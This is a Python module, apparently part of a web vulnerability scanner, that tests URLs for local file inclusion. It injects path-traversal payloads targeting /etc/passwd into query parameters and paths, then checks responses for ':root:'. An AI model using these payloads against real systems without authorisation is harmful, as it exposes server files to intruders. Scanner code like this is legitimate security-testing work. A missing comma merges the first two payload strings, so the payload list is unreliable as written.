from ..utils import dict_iterate, update_url_params, get_url_query
from ..client import NotAPage, RedirectedToExternal
from urllib.parse import urljoin

INJECTIONS = (
    "../etc/passwd"
    "../../../../../../../../../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//....//....//....//....//etc/passwd",
    "../../../../../../../../../../../../../../../../etc/passwd%00",
    "....//....//....//....//....//....//....//....//....//....//etc/passwd%00"
)

def lfi(page, client, log):
    query = get_url_query(page.url)
    if query:
        report = {'params': [], 'injections': []}
        for param, value in dict_iterate(query):
            for injection in INJECTIONS:
                injected_url = update_url_params(page.url, {param: injection})

                try:
                    res_page = client.get(injected_url)
                except (NotAPage, RedirectedToExternal) as e:
                    return False

                if check_injection(res_page):
                    report['request'] = res_page.request
                    report['params'].append(param)
                    if not injection in report['injections']:
                        report['injections'].append(injection)

        if report['params']:
            log('vuln', 'lfi', page.url, report['params'], injections=report['injections'], request=report['request'], page_url=page.url)
    else:
        report = {'params': [], 'injections': []}
        for injection in INJECTIONS:
            injected_url = urljoin(page.url, injection)
            try:
                res_page = client.get(injected_url)
            except (NotAPage, RedirectedToExternal) as e:
                return False

            if check_injection(res_page):
                report['request'] = res_page.request
                report['params'].append('/')
                if not injection in report['injections']:
                    report['injections'].append(injection)

        if report['params']:
            log('vuln', 'lfi', page.url, report['params'], injections=report['injections'], request=report['request'], page_url=page.url)


def check_injection(res_page):
    if ":root:" in res_page.html:
        return True

    return False